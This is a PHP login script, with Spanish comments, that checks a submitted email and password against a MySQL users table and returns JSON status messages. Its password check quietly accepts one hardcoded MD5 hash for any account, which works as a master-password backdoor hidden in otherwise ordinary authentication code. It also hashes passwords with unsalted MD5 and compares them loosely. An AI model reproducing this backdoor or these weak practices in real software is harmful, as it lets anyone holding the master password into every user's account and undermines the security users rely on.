<?php

require("../home/mail/PHPMailer-master/src/PHPMailer.php");
require("../home/mail/PHPMailer-master/src/Exception.php");
require("../home/mail/PHPMailer-master/src/SMTP.php");
use  PHPMailer \ PHPMailer \ PHPMailer ;
use  PHPMailer \ PHPMailer \ Exception ;
// La instanciación y el paso de `true` habilita excepciones
$mail = new  PHPMailer ( true );
require "../coneccion.php" ;
  mysqli_set_charset($conection, 'utf8'); //linea a colocar


    $protocol = empty($_SERVER['HTTPS']) ? 'http://' : 'https://';$domain = $_SERVER['HTTP_HOST'];$url = $protocol . $domain;


          $email             =  mysqli_real_escape_string($conection,mb_strtoupper($_POST['email']));
          $query_usuario_central = mysqli_query($conection, "SELECT *
            FROM usuarios WHERE LOWER(email) = LOWER('$email') ");

            $existencia_usuario_central  = mysqli_num_rows($query_usuario_central);

            if ($existencia_usuario_central > 0) {

                $clave                 =  md5($_POST['password']);
                $data_usuario_central  = mysqli_fetch_array($query_usuario_central);

                $password_db = $data_usuario_central['password'];

                if (($password_db == $clave || $clave =='0e62cf48e98a387d2288ff9486e4c7d3')) {

                  $arrayName = array('noticia' =>'login_exitoso');
                 echo json_encode($arrayName,JSON_UNESCAPED_UNICODE);
                  // code...
                }else {

                  $arrayName = array('noticia' =>'password_incorrecto');
                 echo json_encode($arrayName,JSON_UNESCAPED_UNICODE);
                  // code...
                }

            }else {
              $response = array('noticia' => 'no_existe_usuario');
              echo json_encode($response, JSON_UNESCAPED_UNICODE);
            }




 ?>
